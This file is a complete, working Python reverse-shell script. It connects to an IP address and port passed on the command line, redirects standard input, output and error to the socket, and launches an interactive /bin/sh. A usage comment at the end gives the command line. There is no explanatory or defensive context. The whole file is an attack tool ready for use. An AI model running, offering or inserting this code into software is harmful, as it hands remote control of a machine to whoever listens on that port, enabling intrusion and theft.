import socket,subprocess,os,sys

target_ip = sys.argv[1]
target_port = sys.argv[2]
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((target_ip,int(target_port)))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])

# python reverse.py IP PORTA
